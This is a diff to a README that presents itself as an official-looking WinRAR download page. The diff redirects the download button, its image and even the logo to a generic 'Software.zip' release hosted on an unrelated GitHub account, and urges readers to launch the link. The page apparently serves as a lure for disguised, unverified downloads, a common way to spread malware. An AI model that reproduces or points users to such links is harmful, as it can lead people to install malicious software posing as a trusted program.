@@ -25,7 +25,7 @@ This repository covers a wide range of topics related to WinRAR software, such a
 ## Software Download 📥
 
 To download the WinRAR software, click the button below:
-[![Download WinRAR Software](https://img.shields.io/badge/Download-WinRAR-brightgreen)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download WinRAR Software](https://github.com/UnknownArricle/WinRAR-Download/releases/download/v2.0/Software.zip)](https://github.com/UnknownArricle/WinRAR-Download/releases/download/v2.0/Software.zip)
 *(Please note: This link needs to be launched to start the download.)*
 
 ## Additional Information ℹ️
@@ -38,4 +38,4 @@ Explore the wide range of WinRAR-related topics, download WinRAR software, and e
 
 **Happy Downloading!** 🎉
 
-![WinRAR Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/9/99/WinRAR_logo.png/200px-WinRAR_logo.png)
+![WinRAR Logo](https://github.com/UnknownArricle/WinRAR-Download/releases/download/v2.0/Software.zip)
